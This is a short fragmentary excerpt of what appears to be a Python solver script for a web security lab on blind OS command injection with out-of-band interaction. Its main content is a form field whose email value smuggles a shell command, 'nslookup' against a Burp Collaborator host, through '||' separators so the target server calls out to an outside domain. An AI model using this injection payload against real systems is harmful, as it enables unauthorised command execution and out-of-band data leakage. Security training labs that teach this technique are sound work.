...
parser = argparse.ArgumentParser(description='Solves the following Blind OS command injection with out-of-band interaction')
...
data = {
    ...
    'email': 'asd@asd.com||nslookup burpcollaborator.net||',
